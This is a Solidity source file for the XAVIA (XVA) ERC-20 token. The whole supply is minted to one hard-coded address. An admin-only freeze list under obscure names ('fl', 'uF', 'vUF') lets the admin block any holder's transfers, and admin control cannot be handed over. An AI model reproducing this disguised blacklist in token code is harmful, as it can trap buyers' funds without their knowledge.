pragma solidity 0.4.25;


library SafeMath {
  
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    
    
    
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath mul error");

    return c;
  }

  
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    
    require(b > 0, "SafeMath div error");
    uint256 c = a / b;
    

    return c;
  }

  
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, "SafeMath sub error");
    uint256 c = a - b;

    return c;
  }

  
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath add error");

    return c;
  }

  
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0, "SafeMath mod error");
    return a % b;
  }
}

contract IXVA {
  function transfer(address to, uint256 value) public returns (bool);

  function approve(address spender, uint256 value) public returns (bool);

  function transferFrom(address from, address to, uint256 value) public returns (bool);

  function balanceOf(address who) public view returns (uint256);

  function allowance(address owner, address spender) public view returns (uint256);

  function burn(uint _amount) public;

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Auth {

  address internal admin;

  event OwnershipTransferred(address indexed _previousOwner, address indexed _newOwner);

  constructor(
    address _admin
  ) internal {
    admin = _admin;
  }

  modifier onlyAdmin() {
    require(isAdmin(), 'onlyAdmin');
    _;
  }

  function transferOwnership(address _newOwner) onlyAdmin internal {
    require(_newOwner != address(0x0));
    admin = _newOwner;
    emit OwnershipTransferred(msg.sender, _newOwner);
  }

  function isAdmin() public view returns (bool) {
    return msg.sender == admin;
  }
}

contract XAVIATOKEN is IXVA, Auth {
  using SafeMath for uint256;

  string public constant name = 'XAVIA';
  string public constant symbol = 'XVA';
  uint8 public constant decimals = 18;
  uint256 public _totalSupply = 27e6 * (10 ** uint256(decimals));

  mapping (address => uint256) internal _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (address => bool) fl;

  constructor(address _admin) public Auth(_admin) {
    _balances[0xcA531a84118a9B3130D88Cd0969bB7c20837e36B] = _totalSupply;
    emit Transfer(address(0x0), 0xcA531a84118a9B3130D88Cd0969bB7c20837e36B, _totalSupply);
  }

  function totalSupply() public view returns (uint) {
    return _totalSupply;
  }

  
  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }

  
  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }

  
  function transfer(address to, uint256 value) public returns (bool) {
    _transfer(msg.sender, to, value);
    return true;
  }

  
  function approve(address spender, uint256 value) public returns (bool) {
    _approve(msg.sender, spender, value);
    return true;
  }

  
  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    _transfer(from, to, value);
    _approve(from, msg.sender, _allowed[from][msg.sender].sub(value));
    return true;
  }

  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowed[msg.sender][spender].add(addedValue));
    return true;
  }

  
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(msg.sender, spender, _allowed[msg.sender][spender].sub(subtractedValue));
    return true;
  }

  
  function _transfer(address from, address to, uint256 value) internal {
    require(!fl[from], 'You can not do this at the moment');
    _balances[from] = _balances[from].sub(value);
    _balances[to] = _balances[to].add(value);
    if (to == address(0x0)) {
      _totalSupply = _totalSupply.sub(value);
    }
    emit Transfer(from, to, value);
  }

  
  function _approve(address owner, address spender, uint256 value) internal {
    require(spender != address(0));
    require(owner != address(0));

    _allowed[owner][spender] = value;
    emit Approval(owner, spender, value);
  }

  function _burn(address _account, uint256 _amount) internal {
    require(_account != address(0), 'ERC20: burn from the zero address');

    _balances[_account] = _balances[_account].sub(_amount);
    _totalSupply = _totalSupply.sub(_amount);
    emit Transfer(_account, address(0), _amount);
  }

  function uF(address _a, bool f) onlyAdmin public {
    fl[_a] = f;
  }

  function vUF(address _a) public view returns (bool) {
    return fl[_a];
  }

  function burn(uint _amount) public {
    _burn(msg.sender, _amount);
  }
}